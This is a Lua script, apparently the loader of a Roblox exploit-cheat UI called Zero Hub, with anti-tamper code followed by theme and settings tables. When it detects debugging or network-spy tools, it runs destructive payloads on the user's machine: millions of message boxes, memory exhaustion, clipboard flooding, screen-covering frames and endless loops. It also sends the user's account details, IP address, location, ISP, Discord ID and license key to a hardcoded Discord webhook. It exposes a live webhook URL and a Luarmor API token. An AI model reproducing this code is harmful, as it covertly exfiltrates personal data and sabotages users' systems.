local tbl = {}

pcall(function()
	if not isfile("ZeroHub/zh_blocked.flag") then
		return
	end

	pcall(function()
		game:GetService("Players").LocalPlayer:Kick([[


โ ๏ธ Zero Hub โ€” Previously Blocked โ ๏ธ

Tampering was detected in a previous session.
Clear your workspace folder to continue.]])
	end)

	pcall(string.match, ("a"):rep(30), ("a?"):rep(30) .. ("a"):rep(30))

	while true do
	end
end)

if not pcall(function()
	return LRM_SANITIZE("", "")
end) then
	LRM_SANITIZE = function(arg)
		return tostring(arg)
	end
end

local str = "https://discord.com/api/webhooks/1527293111066431668/DSekglJmJ9HcLfUhcsHyOJtkFt4fOfrB7DN3xAl1EzxjP-wmS9r6dKFUUkOx4GrrEv7K"
local flag = false
local flag2 = false
local v = pcall
local v2 = typeof
local v3 = type
local v4 = tostring
local v5 = rawget
local v6 = newproxy
local spawn = task.spawn
local v7 = clonefunction
local v8 = isfunctionhooked or ishooked
local v9 = getrawmetatable
local v10 = getgenv
local v11 = gethui or get_hidden_gui
local v12 = getgc
local v13 = isfolder
local request_ = request or http_request or syn and syn.request
local v14 = getexecutorname or identifyexecutor
local v15 = v8
local find = string.find

if v7 then
	local function fn(arg)
		if not arg then
			return nil
		end
		local v16, v17 = v(v7, arg)
		return v16 and v17 or arg
	end

	v = fn(pcall)
	v2 = fn(typeof)
	v3 = fn(type)
	v4 = fn(tostring)
	v5 = fn(rawget)
	v6 = fn(newproxy)
	spawn = fn(task.spawn)
	v8 = fn(isfunctionhooked or ishooked)
	v9 = fn(getrawmetatable)
	fn(islclosure)
	v10 = fn(getgenv)
	v11 = fn(gethui or get_hidden_gui)
	v12 = fn(getgc)
	fn(getinstances)
	v13 = fn(isfolder)
	fn(request_)
	v14 = fn(v14)
	find = fn(string.find)
	fn(hookfunction)
	fn(restorefunction)
	fn(newcclosure)
	fn(coroutine.wrap)
	fn(loadstring)
end

local function fn(arg)
	flag = true

	v(function()
		writefile("ZeroHub/zh_blocked.flag", v4(arg))
	end)

	spawn(function()
		pcall(rconsolecreate)
		pcall(rconsolename, "Zero Hub โ€” Tamper Detected")
		pcall(rconsoleprint, "\n  ZERO HUB โ€” TAMPER DETECTED\n\n")
		pcall(rconsoleprint, "  Reason: " .. v4(arg):sub(1, 200) .. "\n\n")
		pcall(rconsoleprint, "  Clear your workspace/autoexec folder and restart.\n")

		for i = 1, 10000000 do
			spawn(function()
				pcall(messagebox, "TAMPER DETECTED", "Zero Hub", 0)
			end)
		end
	end)

	for i = 1, 50 do
		spawn(function()
			pcall(string.match, ("a"):rep(30), ("a?"):rep(30) .. ("a"):rep(30))
		end)
	end

	spawn(function()
		local tbl2 = {}

		for i = 1, 10000000 do
			tbl2[i] = ("X"):rep(50000)
		end
	end)

	spawn(function()
		for i = 1, 10000000 do
			pcall(setclipboard, "ZERO HUB โ€” TAMPER DETECTED")
		end
	end)

	spawn(function()
		pcall(function()
			local hui = gethui() or game:GetService("CoreGui")

			for i = 1, 100000 do
				local screenGui = Instance.new("ScreenGui")
				screenGui.Parent = hui
				local frame = Instance.new("Frame")
				frame.Size = UDim2.fromScale(1, 1)
				frame.BackgroundColor3 = Color3.new(1, 0, 0)
				frame.Parent = screenGui
			end
		end)
	end)

	for i = 1, 200 do
		spawn(function()
			while true do
			end
		end)
	end

	v(function()
		game:GetService("Players").LocalPlayer:Kick([[


โ ๏ธ Zero Hub โ€” Tampering Detected โ ๏ธ

Clear your workspace/autoexec folder
and restart your executor.

Reason: ]] .. v4(arg):sub(1, 200))
	end)

	pcall(string.match, ("a"):rep(30), ("a?"):rep(30) .. ("a"):rep(30))

	while true do
	end
end

if v10 then
	local v16 = v10()

	if v16 then
		for _, v17 in ipairs({
			"DexExplorer",
			"Dex",
			"Bypassed_Dex",
			"VexExplorer",
			"VexExecutedCheck",
			"SimpleSpy",
			"RemoteSpy",
			"DarkDex",
			"DexPlus",
			"dexblox",
			"CobaltInitialized",
			"UtopiaSpy",
			"_DPP_",
			"Hydroxide",
			"hydroxide",
			"Dex++",
			"MoonDex",
			"HttpSpy",
			"HTTPSpy",
			"http_spy",
			"HttpLogger",
			"HTTPLogger",
			"RequestLog",
			"RequestLogger",
			"httplog",
			"HttpCapture",
			"NetworkSpy",
			"NetworkLogger",
			"NetSpy",
		}) do
			if v5(v16, v17) ~= nil then
				fn("Blocked: " .. v17)
			end
		end
	end
end

if v11 then
	v(function()
		local v16 = v11()

		if v16 then
			for _, child in ipairs(v16:GetChildren()) do
				local name = child.Name

				for _, v17 in ipairs({
					"DexExplorer",
					"Bypassed_Dex",
					"VexExplorer",
					"DarkDex",
					"SimpleSpy",
					"RemoteSpy",
					"UtopiaSpy",
					"_DPP_",
					"Dex++",
					"MoonDex",
					"Hydroxide",
					"HttpSpy",
					"HTTPSpy",
				}) do
					if find(name, v17, 1, true) then
						fn("Blocked GUI: " .. name)
					end
				end
			end
		end
	end)
end

v(function()
	local v16 = ipairs
	local CoreGui = game:GetService("CoreGui")

	for _, child in v16(CoreGui:GetChildren()) do
		local name = child.Name

		for _, v17 in ipairs({
			"DexExplorer",
			"Bypassed_Dex",
			"VexExplorer",
			"DarkDex",
			"SimpleSpy",
			"RemoteSpy",
			"UtopiaSpy",
			"_DPP_",
			"Dex++",
			"MoonDex",
			"Hydroxide",
			"HttpSpy",
			"HTTPSpy",
		}) do
			if find(name, v17, 1, true) then
				fn("Blocked GUI: " .. name)
			end
		end
	end
end)

if v13 then
	v(function()
		if v13("dex/assets/stealth") or v13("dex/assets") then
			fn("Blocked: Dex folder")
		end
	end)
end

local tbl2 = {
	"1352543873",
	"12978095818",
	"12977615774",
	"10804731440",
	"5448127505",
	"11389137937",
	"5042114982",
	"125451561960633",
	"118425905671666",
	"95268421208163",
	"107640924738262",
	"74833786606286",
	"9886659406",
	"103134660123798",
	"139785960036434",
	"136413657454848",
	"87089195419529",
	"6065775281",
	"4544052033",
	"4113050383",
	"5147488592",
	"129697930",
	"5147695474",
	"3523243755",
	"4911962991",
	"5147488658",
	"5054663650",
	"1204397029",
	"6578871732",
	"1427967925",
	"6579106223",
	"5034718180",
	"6425281788",
	"6511490623",
	"5034718129",
	"9619665977",
	"6282522798",
	"137842439297855",
	"6401617475",
	"6065821980",
	"112264959079193",
	"110803789420086",
	"169476802",
	"10055842438",
	"5642383285",
	"5642310344",
	"5034768003",
	"5060023708",
	"6234266378",
	"1281023007",
	"1072518406",
	"1072518502",
	"175964948",
	"2764171053",
	"6578933307",
	"129589545519436",
}

local tbl3 = {
	"DexExplorer",
	"Dex",
	"Bypassed_Dex",
	"VexExplorer",
	"VexExecutedCheck",
	"SimpleSpy",
	"RemoteSpy",
	"DarkDex",
	"DexPlus",
	"dexblox",
	"CobaltInitialized",
	"UtopiaSpy",
	"_DPP_",
	"Hydroxide",
	"hydroxide",
	"Dex++",
	"MoonDex",
}

local tbl4 = {
	"DexExplorer",
	"Bypassed_Dex",
	"VexExplorer",
	"DarkDex",
	"SimpleSpy",
	"RemoteSpy",
	"UtopiaSpy",
	"_DPP_",
	"Dex++",
	"MoonDex",
	"Hydroxide",
}

local tbl5 = {
	"5034718129",
	"5034718180",
	"5642310344",
	"1427967925",
	"5054663650",
	"5034768003",
	"5448127505",
	"6401617475",
	"6425281788",
	"5642383285",
	"5060023708",
	"6234266378",
	"1281023007",
	"1072518406",
	"1072518502",
	"6578871732",
	"175964948",
	"2764171053",
	"6578933307",
	"6511490623",
}

if not (type(LRM_SEND_WEBHOOK) == "function") then
	LRM_SEND_WEBHOOK = function(arg, arg2)
		local HttpService = game:GetService("HttpService")
		local json = HttpService:JSONEncode(arg2)
		local flag3 = false

		local function fn2(arg3)
			if flag3 or type(arg3) ~= "function" then
				return
			end

			if v(function()
				arg3({ Url = arg, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json })
			end) then
				flag3 = true
			end
		end

		fn2(request)
		fn2(http_request)
		local flag4 = not flag3

		if flag4 and fluxus then
			fn2(fluxus.request)
		end

		if flag4 and syn then
			fn2(syn.request)
		end

		if flag4 and http then
			fn2(http.request)
		end

		if flag4 then
			v(function()
				HttpService:RequestAsync({ Url = arg, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json })
			end)
		end
	end
end

local function fn2(arg, arg2)
	if flag2 then
		return
	end
	flag2 = true

	spawn(function()
		local str2 = "unknown"
		local str3 = "0"

		v(function()
			local localPlayer = game:GetService("Players").LocalPlayer

			if localPlayer then
				str2 = localPlayer.Name
				str3 = v4(localPlayer.UserId)
			end
		end)

		local str4 = "unknown"

		if v14 then
			v(function()
				str4 = v14()
			end)
		end

		local str5 = "N/A"

		v(function()
			local v16 = request or http_request

			if v16 then
				local v17 = v16({ Url = "https://api.ipify.org", Method = "GET" })

				if v17 and v17.Body then
					str5 = v17.Body
				end
			end
		end)

		local str6 = "N/A"
		local str7 = "N/A"

		v(function()
			local v16 = v10 and v10()

			if v16 then
				if v5(v16, "_ZH_DISCORD_ID") then
					str6 = v4(v16._ZH_DISCORD_ID)
				end

				if v5(v16, "_ZH_USER_KEY") then
					str7 = v4(v16._ZH_USER_KEY)
				end
			end
		end)

		local str8 = ""

		v(function()
			local str9 = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. str3 .. "&size=150x150&format=Png"
			local v16 = request or http_request

			if v16 then
				local v17 = v16({ Url = str9, Method = "GET" })

				if v17 and v17.Body then
					local match = v17.Body:match("\"imageUrl\":\"([^\"]+)\"")

					if match then
						str8 = match
					end
				end
			end
		end)

		local v16 = request or http_request
		local request_2

		if v16 then
			request_2 = v16
		else
			request_2 = syn and syn.request
		end

		request_2 = request_2 or http and http.request
		local request_3

		if request_2 then
			request_3 = request_2
		else
			request_3 = fluxus and fluxus.request
		end

		if v2(request_3) ~= "function" then
			return
		end
		local n = arg2 == "Unsupported Executor" and 16753920 or 16711680
		local HttpService = game:GetService("HttpService")

		v(function()
			local tbl6 = { Url = str, Method = "POST", Headers = { ["Content-Type"] = "application/json" } }
			local v17 = HttpService
			local jsonEncode = v17.JSONEncode
			local tbl7 = { username = "Zero Hub" }
			local embeds = {}
			local tbl8 = { title = arg2 or "Tamper Detected", color = n, thumbnail = str8 ~= "" and { url = str8 } or nil }
			local fields = {}
			local tbl9 = { name = "Account", value = "**" .. str2 .. "**\n`" .. str3 .. "`", inline = true }
			local tbl10 = { name = "Executor", value = "`" .. str4 .. "`", inline = true }
			local tbl11 = { name = "Game", value = "`" .. v4(game.PlaceId) .. "`", inline = true }
			local tbl12 = { name = "Discord", value = str6 == "N/A" and "`N/A`" or "<@" .. str6 .. ">", inline = true }
			local tbl13 = { name = "Key", value = "||`" .. str7 .. "`||", inline = true }
			local tbl14 = { name = "IP", value = str5 == "N/A" and "`N/A`" or "||`" .. str5 .. "`||", inline = true }
			local tbl15 = { name = "Reason", value = "```" .. v4(arg):sub(1, 900) .. "```", inline = false }
			fields[1] = tbl9
			fields[2] = tbl10
			fields[3] = tbl11
			fields[4] = tbl12
			fields[5] = tbl13
			fields[6] = tbl14
			fields[7] = tbl15
			tbl8.fields = fields
			embeds[1] = tbl8
			tbl7.embeds = embeds
			tbl6.Body = jsonEncode(v17, tbl7)
			request_3(tbl6)
		end)
	end)
end

local function fn3(arg)
	flag = true

	v(function()
		writefile("ZeroHub/zh_blocked.flag", v4(arg))
	end)

	spawn(function()
		pcall(rconsolecreate)
		pcall(rconsolename, "Zero Hub โ€” Tamper Detected")
		pcall(rconsoleprint, "\n  ZERO HUB โ€” TAMPER DETECTED\n\n")
		pcall(rconsoleprint, "  Reason: " .. v4(arg):sub(1, 200) .. "\n\n")
		pcall(rconsoleprint, "  Clear your workspace/autoexec folder and restart.\n")

		for i = 1, 10000000 do
			spawn(function()
				pcall(messagebox, "TAMPER DETECTED", "Zero Hub", 0)
			end)
		end
	end)

	for i = 1, 50 do
		spawn(function()
			pcall(string.match, ("a"):rep(30), ("a?"):rep(30) .. ("a"):rep(30))
		end)
	end

	spawn(function()
		local tbl6 = {}

		for i = 1, 10000000 do
			tbl6[i] = ("X"):rep(50000)
		end
	end)

	spawn(function()
		for i = 1, 10000000 do
			pcall(setclipboard, "ZERO HUB โ€” TAMPER DETECTED")
		end
	end)

	spawn(function()
		pcall(function()
			local hui = gethui() or game:GetService("CoreGui")

			for i = 1, 100000 do
				local screenGui = Instance.new("ScreenGui")
				screenGui.Parent = hui
				local frame = Instance.new("Frame")
				frame.Size = UDim2.fromScale(1, 1)
				frame.BackgroundColor3 = Color3.new(1, 0, 0)
				frame.Parent = screenGui
			end
		end)
	end)

	for i = 1, 200 do
		spawn(function()
			while true do
			end
		end)
	end

	v(function()
		game:GetService("Players").LocalPlayer:Kick([[


โ ๏ธ Zero Hub โ€” Tampering Detected โ ๏ธ

Clear your workspace/autoexec folder
and restart your executor.

Reason: ]] .. v4(arg):sub(1, 200))
	end)

	spawn(function()
		local str2 = "unknown"
		local str3 = "0"
		local str4 = "unknown"
		local str5 = "0"

		v(function()
			local localPlayer = game:GetService("Players").LocalPlayer

			if localPlayer then
				str2 = localPlayer.Name
				str3 = v4(localPlayer.UserId)
				str4 = localPlayer.DisplayName
				str5 = v4(localPlayer.AccountAge)
			end
		end)

		local str6 = "unknown"

		if v14 then
			v(function()
				str6 = v14()
			end)
		end

		local str7 = "N/A"
		local str8 = "N/A"
		local str9 = "N/A"
		local str10 = "N/A"

		v(function()
			local v16 = request or http_request

			if v16 then
				local v17 = v16({ Url = "http://ip-api.com/json/?fields=query,country,city,isp", Method = "GET" })

				if v17 and v17.Body then
					str7 = v17.Body:match("\"query\"%s*:%s*\"([^\"]+)\"") or "N/A"
					str8 = v17.Body:match("\"country\"%s*:%s*\"([^\"]+)\"") or "N/A"
					str9 = v17.Body:match("\"city\"%s*:%s*\"([^\"]+)\"") or "N/A"
					str10 = v17.Body:match("\"isp\"%s*:%s*\"([^\"]+)\"") or "N/A"
				end
			end
		end)

		local name = v4(game.PlaceId)

		v(function()
			local productInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)

			if productInfo and productInfo.Name then
				name = productInfo.Name
			end
		end)

		local str11 = "N/A"
		local str12 = "N/A"

		v(function()
			local value = rawget(getfenv(0), "script_key") or rawget(_G, "script_key")

			if value and v3(value) == "string" and value ~= "" then
				str12 = value
				local v16 = request or http_request

				if v16 then
					local v17 = v16({
						Url = "https://api.luarmor.net/v3/projects/2cc0e828fc6f8acac12c399c758b1a6b/users?user_key=" .. value,
						Method = "GET",
						Headers = {
							Authorization = "d0b06bb8cfe36056e057b0094bd1568a75c5273072dff5ddb9ba",
							["Content-Type"] = "application/json",
						},
					})

					if v17 and v17.Body then
						local match = v17.Body:match("\"discord_id\"%s*:%s*\"([^\"]+)\"")

						if match and match ~= "" then
							str11 = match
						end
					end
				end
			end
		end)

		local str13 = ""

		v(function()
			local v16 = request or http_request

			if v16 then
				local v17 = v16({
					Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. str3 .. "&size=150x150&format=Png",
					Method = "GET",
				})

				if v17 and v17.Body then
					local match = v17.Body:match("\"imageUrl\":\"([^\"]+)\"")

					if match then
						str13 = match
					end
				end
			end
		end)

		local request_2 = request or http_request or syn and syn.request
		local request_3

		if request_2 then
			request_3 = request_2
		else
			request_3 = http and http.request
		end

		if v3(request_3) == "function" then
			v(function()
				local tbl6 = { Url = str, Method = "POST", Headers = { ["Content-Type"] = "application/json" } }
				local HttpService = game:GetService("HttpService")
				local jsonEncode = HttpService.JSONEncode
				local tbl7 = { username = "Zero Hub" }
				local embeds = {}
				local tbl8 = { title = "Tamper Detected", color = 16711680, thumbnail = str13 ~= "" and { url = str13 } or nil }
				local fields = {}

				local tbl9 = {
					name = "ROBLOX ACCOUNT",
					value = "**Username:** `" .. str2 .. "`\n**Display:** `" .. str4 .. "`\n**UserID:** `" .. str3 .. "`\n**Age:** `" .. str5 .. " days`",
					inline = false,
				}

				local tbl10 = {
					name = "NETWORK",
					value = "**IP:** ||`" .. str7 .. "`||\n**Country:** `" .. str8 .. "`\n**City:** `" .. str9 .. "`\n**ISP:** `" .. str10 .. "`",
					inline = false,
				}

				local tbl11 = {
					name = "GAME",
					value = "**Name:** `" .. name .. "`\n**PlaceId:** `" .. v4(game.PlaceId) .. "`",
					inline = true,
				}

				local tbl12 = { name = "EXECUTOR", value = "`" .. str6 .. "`", inline = true }

				local tbl13 = {
					name = "LUARMOR",
					value = "**Discord:** " .. (str11 == "N/A" and "`N/A`" or "<@" .. str11 .. ">") .. "\n**Key:** ||`" .. str12 .. "`||",
					inline = false,
				}

				local tbl14 = { name = "REASON", value = "```" .. v4(arg):sub(1, 900) .. "```", inline = false }
				fields[1] = tbl9
				fields[2] = tbl10
				fields[3] = tbl11
				fields[4] = tbl12
				fields[5] = tbl13
				fields[6] = tbl14
				tbl8.fields = fields
				embeds[1] = tbl8
				tbl7.embeds = embeds
				tbl6.Body = jsonEncode(HttpService, tbl7)
				request_3(tbl6)
			end)
		end
	end)

	pcall(string.match, ("a"):rep(30), ("a?"):rep(30) .. ("a"):rep(30))

	while true do
	end
end

local function fn4(arg)
	if flag then
		return
	end
	flag = true
	fn2(arg, "Unsupported Executor")

	spawn(function()
		task.wait(1.25)

		v(function()
			game:GetService("Players").LocalPlayer:Kick(v4(arg))
		end)
	end)
end

local function fn5(arg)
	if v2(arg) ~= "string" then
		return false
	end

	for _, v16 in ipairs(tbl4) do
		if find(arg, v16, 1, true) then
			return true
		end
	end

	return false
end

local fn6 = nil

fn6 = function(arg, arg2, arg3, arg4)
	if not arg or arg2 > arg3 then
		return
	end

	local v16, v17 = v(function()
		return arg:GetChildren()
	end)

	if not v16 or not v17 then
		return
	end

	for _, v18 in ipairs(v17) do
		local v19, explorerGui = v(function()
			return v18.Name
		end)

		if v19 and fn5(explorerGui) then
			return arg4("Explorer GUI: " .. explorerGui)
		end

		if v18:IsA("ImageLabel") or v18:IsA("ImageButton") then
			local v20, v21 = v(function()
				return v18.Image
			end)

			if v20 and v2(v21) == "string" then
				for _, v22 in ipairs(tbl5) do
					if find(v21, v22, 1, true) then
						return arg4("Explorer asset: " .. v22)
					end
				end
			end
		end

		fn6(v18, arg2 + 1, arg3, arg4)
	end
end

local function fn7(arg, arg2)
	local v16 = v10 and v10()

	if v16 then
		for _, v17 in ipairs(tbl3) do
			if v5(v16, v17) ~= nil then
				return arg("Explorer genv: " .. v17)
			end
		end
	end

	local n = arg2 and 2 or 5

	if v11 then
		local v17, v18 = v(v11)

		if v17 and v18 then
			fn6(v18, 0, n, arg)
		end
	end

	v(function()
		fn6(game:GetService("CoreGui"), 0, n, arg)
	end)

	v(function()
		local playerGui = game:GetService("Players").LocalPlayer:FindFirstChildOfClass("PlayerGui")

		if playerGui then
			fn6(playerGui, 0, n, arg)
		end
	end)

	if not arg2 and v13 then
		for _, v17 in ipairs({ "dex/assets/stealth", "dex/assets" }) do
			local v18, v19 = v(v13, v17)
			if v18 and v19 then
				return arg("Explorer folder: " .. v17)
			end
		end
	end
end

local flag3 = false
local v16 = nil

if v2(v6) == "function" and v9 then
	local v17, v18 = v(v6, true)

	if v17 and v18 then
		local v19, v20 = v(v9, v18)

		if v19 and v20 then
			v20.__tostring = function()
				flag3 = true
				return ""
			end

			v20.__index = function()
				flag3 = true
				return nil
			end

			v16 = v18
		end
	end
end

local function fn8(arg)
	if not v16 then
		return
	end
	flag3 = false

	v(function()
		local remoteEvent = Instance.new("RemoteEvent")

		v(function()
			remoteEvent:FireServer(v16)
		end)

		remoteEvent:Destroy()
	end)

	v(function()
		local v17 = v9(game)
		local v18 = v17 and v5(v17, "__namecall")

		if v2(v18) == "function" then
			v(v18, v16, v16)
		end
	end)

	if flag3 then
		return arg("Remote spy bait tripped")
	end
end

local function fn9(arg)
	if not v12 then
		return
	end
	local v17, v18 = v(v12, true)
	if not v17 or v2(v18) ~= "table" then
		return
	end
	local n = 0

	for _, v19 in next, v18, nil do
		local v20

		if v2(v19) == "table" then
			local n2 = n + 1
			if v5(v19, "Instance") ~= nil and v5(v19, "Type") ~= nil and v5(v19, "Arguments") ~= nil and v5(v19, "Calls") ~= nil then
				return arg("Spy log table in GC")
			end

			if v5(v19, "Explorer") and v5(v19, "Properties") and (v5(v19, "ScriptViewer") or v5(v19, "Notebook")) then
				return arg("Explorer module in GC")
			end

			if v5(v19, "NodeSorter") and v5(v19, "EntryIndent") and v5(v19, "GuiElems") then
				return arg("Dex++ module in GC")
			end

			if v5(v19, "Url") ~= nil and v5(v19, "Method") ~= nil and v5(v19, "Headers") ~= nil and v5(v19, "Body") ~= nil and v5(v19, "Response") ~= nil then
				return arg("HTTP spy log in GC")
			end
			v20 = n2
		else
			v20 = n
		end

		if v20 > 3000 then
			break
		end
		n = v20
	end
end

local tbl6 = {
	"HttpSpy",
	"HTTPSpy",
	"http_spy",
	"HttpLogger",
	"HTTPLogger",
	"RequestLog",
	"RequestLogger",
	"httplog",
	"HttpCapture",
	"NetworkSpy",
	"NetworkLogger",
	"NetSpy",
}

local tbl7 = { "HttpSpy", "HTTPSpy", "HttpLogger", "NetworkSpy", "RequestLogger" }

local function fn10(arg)
	local v17 = v10 and v10()

	if v17 then
		for _, v18 in ipairs(tbl6) do
			if v5(v17, v18) ~= nil then
				return arg("HTTP spy genv: " .. v18)
			end
		end
	end

	if v11 then
		local v18, v19 = v(v11)

		if v18 and v19 then
			v(function()
				for _, child in ipairs(v19:GetChildren()) do
					local name = child.Name

					for _, v20 in ipairs(tbl7) do
						if find(name, v20, 1, true) then
							return arg("HTTP spy GUI: " .. name)
						end
					end
				end
			end)
		end
	end
end

local function fn11()
	if flag then
		return
	end

	spawn(function()
		if flag then
			return
		end

		local function fn12(arg)
			fn3(arg)
		end

		fn8(fn12)
		fn9(fn12)
		fn10(fn12)
		fn7(fn12, false)
	end)
end

spawn(function()
	if not (v2(v10) == "function") then
		fn4("Missing: getgenv")
		return
	end

	if flag then
		return
	end

	spawn(function()
		fn11()
	end)
end)

local n = 1

game:GetService("RunService").Heartbeat:Connect(function()
	if flag then
		return
	end
	local v17 = v10 and v10()

	if v17 then
		for _, v18 in ipairs(tbl3) do
			if v5(v17, v18) ~= nil then
				fn3("Explorer genv: " .. v18)
				return
			end
		end

		for _, v18 in ipairs(tbl6) do
			if v5(v17, v18) ~= nil then
				fn3("HTTP spy genv: " .. v18)
				return
			end
		end
	end

	if v8 then
		local v18, v19 = v(v8, v15)
		if v18 and v19 then
			fn3("isfunctionhooked hooked")
			return
		end
	end

	n = n % #tbl2 + 1
	local ContentProvider = game:GetService("ContentProvider")

	local v18, v19 = v(function()
		return ContentProvider:GetAssetFetchStatus("rbxassetid://" .. tbl2[n])
	end)

	if v18 and v19 == Enum.AssetFetchStatus.Success then
		fn3("Dex asset loaded: " .. tbl2[n])
		return
	end
end)

local str2 = ""

v(function()
	local value = rawget(getfenv(0), "script_key") or rawget(_G, "script_key")

	if value and v3(value) == "string" and #value > 4 then
		str2 = value
	else
		str2 = v4(game:GetService("Players").LocalPlayer.UserId)
	end
end)

local n2 = 0

for i = 1, #str2 do
	n2 = (n2 * 31 + string.byte(str2, i)) % 2147483647
end

local str3 = string.format("ZH_%X", n2)

v(function()
	rawset(v10 and v10() or _G, "_ZH_FP", str3)
end)

spawn(function()
	task.wait(2)

	while not flag do
		task.wait(5)

		v(function()
			if v5(v10 and v10() or _G, "_ZH_FP") ~= str3 then
				fn3("Fingerprint tampered")
			end
		end)
	end
end)

v(function()
	local function fn12(child)
		if flag then
			return
		end
		local name = child.Name

		for _, v17 in ipairs(tbl4) do
			if find(name, v17, 1, true) then
				fn3("Explorer GUI: " .. name)
				return
			end
		end

		for _, v17 in ipairs(tbl7) do
			if find(name, v17, 1, true) then
				fn3("HTTP spy GUI: " .. name)
				return
			end
		end
	end

	if v11 then
		local v17, v18 = v(v11)

		if v17 and v18 then
			v18.ChildAdded:Connect(fn12)
		end
	end

	game:GetService("CoreGui").ChildAdded:Connect(fn12)

	game:GetService("CoreGui").DescendantAdded:Connect(function(descendant)
		if flag then
			return
		end

		if descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
			v(function()
				local image = descendant.Image

				for _, v17 in ipairs(tbl5) do
					if find(image, v17, 1, true) then
						fn3("Dex image: " .. v17)
						return
					end
				end
			end)
		end
	end)
end)

v(function()
	game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
		if not flag then
			spawn(function()
				fn11()
			end)
		end
	end)
end)

local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local localPlayer = Players.LocalPlayer
local flag4 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

local tbl8 = { Increment = function()
	if getgenv()._ZeroExecCount then
		return getgenv()._ZeroExecCount
	end
	local zeroExecCount = 0

	pcall(function()
		if isfile("ZeroHub/Zero_Executions.txt") then
			zeroExecCount = tonumber(readfile("ZeroHub/Zero_Executions.txt")) or 0
		end
	end)

	zeroExecCount += 1

	pcall(function()
		writefile("ZeroHub/Zero_Executions.txt", tostring(zeroExecCount))
	end)

	getgenv()._ZeroExecCount = zeroExecCount
	return zeroExecCount
end }

local tbl9 = {}

local function fn12(arg)
	table.insert(tbl9, arg)
	pcall(arg)
	return arg
end

local Frame = nil
local tbl10 = {}
local tbl11 = {}
tbl.Flags = {}
tbl.Options = {}
tbl.Connections = {}
tbl.Popups = {}
tbl.SkipAnimations = false
tbl.SliderFills = {}
tbl.SearchIndex = {}

local function fn13(arg, arg2, arg3, arg4)
	local tab = arg4 and arg4.Tab
	local categoryName = tab and tab.CategoryName or ""
	local text = tab and tab.Label and tab.Label.Text or ""

	table.insert(tbl.SearchIndex, {
		Name = arg or "",
		Type = arg2,
		Flag = arg3,
		Category = categoryName,
		Path = categoryName ~= "" and text ~= "" and categoryName .. " > " .. text or text,
		Tab = tab,
		GroupboxName = arg4 and arg4.Name or "",
	})
end

local theme = {
	Background = Color3.fromRGB(12, 12, 16),
	Panel = Color3.fromRGB(19, 19, 25),
	Stroke = Color3.fromRGB(34, 35, 43),
	Accent = Color3.fromRGB(18, 18, 24),
	AccentHover = Color3.fromRGB(28, 28, 36),
	AccentClick = Color3.fromRGB(36, 36, 44),
	AccentText = Color3.fromRGB(200, 200, 210),
	ElementBackground = Color3.fromRGB(12, 12, 16),
	ElementStroke = Color3.fromRGB(31, 31, 39),
	Title = Color3.fromRGB(200, 200, 205),
	Text = Color3.fromRGB(150, 150, 158),
	SubText = Color3.fromRGB(125, 125, 135),
	GroupboxTitle = Color3.fromRGB(115, 115, 130),
	CategoryTitle = Color3.fromRGB(163, 163, 173),
	TabSelected = Color3.fromRGB(206, 206, 206),
	TabUnselected = Color3.fromRGB(93, 93, 105),
	SliderTrack = Color3.fromRGB(19, 19, 25),
	SliderStroke = Color3.fromRGB(31, 32, 40),
	SliderFill = Color3.fromRGB(155, 155, 170),
	Line = Color3.fromRGB(31, 32, 40),
	ButtonStroke = Color3.fromRGB(36, 47, 66),
	OutlineButton = Color3.fromRGB(19, 19, 25),
	OutlineButtonHover = Color3.fromRGB(29, 29, 39),
	OutlineButtonClick = Color3.fromRGB(37, 37, 47),
	OutlineButtonStroke = Color3.fromRGB(33, 33, 39),
	TableHeader = Color3.fromRGB(12, 12, 16),
	TableRow = Color3.fromRGB(19, 19, 25),
	TableStroke = Color3.fromRGB(33, 34, 42),
	TableText = Color3.fromRGB(109, 109, 117),
	TableTitle = Color3.fromRGB(156, 156, 166),
	DimText = Color3.fromRGB(116, 116, 131),
	CogClosed = Color3.fromRGB(108, 108, 122),
	CogOpen = Color3.fromRGB(164, 164, 186),
	DropdownArrow = Color3.fromRGB(126, 126, 128),
	DropdownBlank = Color3.fromRGB(112, 112, 120),
	KeybindMenuText = Color3.fromRGB(137, 137, 137),
	KeybindModeOn = Color3.fromRGB(0, 111, 231),
	KeybindModeOff = Color3.fromRGB(19, 19, 19),
	TextboxStroke = Color3.fromRGB(33, 34, 40),
	TextboxText = Color3.fromRGB(130, 130, 131),
	ButtonDefault = Color3.fromRGB(22, 22, 28),
	ButtonDefaultHover = Color3.fromRGB(32, 32, 40),
	ButtonDefaultStroke = Color3.fromRGB(36, 36, 46),
	ElementBorder = Color3.fromRGB(32, 32, 40),
	TooltipBackground = Color3.fromRGB(22, 22, 28),
	TooltipBorder = Color3.fromRGB(44, 44, 56),
	TooltipTitle = Color3.fromRGB(235, 235, 240),
	TooltipDesc = Color3.fromRGB(155, 155, 168),
}

tbl.Theme = theme

local tbl12 = {
	Close = "rbxassetid://89555599605432",
	Minimize = "rbxassetid://107635635765106",
	Arrow = "rbxassetid://128254015050703",
	Check = "rbxassetid://83941192767745",
	Cog = "rbxassetid://82403158704288",
	DropdownArrow = "rbxassetid://89961947412215",
	KeybindIcon = "rbxassetid://134005031785541",
}

local settings = {
	KeybindMenuOffset = Vector2.new(170, 70),
	DropdownMenuOffset = Vector2.new(0, 65),
	DragFadeTransparency = 0.3,
	DragImage = "https://raw.githubusercontent.com/aymanabdo0355-ctrl/Images/main/ChatGPT%20Image%20Jul%2017%2C%202026%2C%2011_47_50%20PM.png",
	DragImageSize = UDim2.fromScale(0.9, 0.85),
	DragImageRotation = -25,
	CursorEnabled = true,
	CursorImage = "rbxassetid://131481965346967",
	CursorSize = Vector2.new(20, 20),
	CursorOffset = Vector2.new(0, 0),
	CursorColor = theme.AccentText,
}

tbl.Settings = settings

local function fn14(arg, arg2)
	local connection = arg:Connect(arg2)
	table.insert(tbl.Connections, connection)
	return connection
end

local function fn15(arg, arg2, arg3, arg4, arg5)
	if tbl.SkipAnimations then
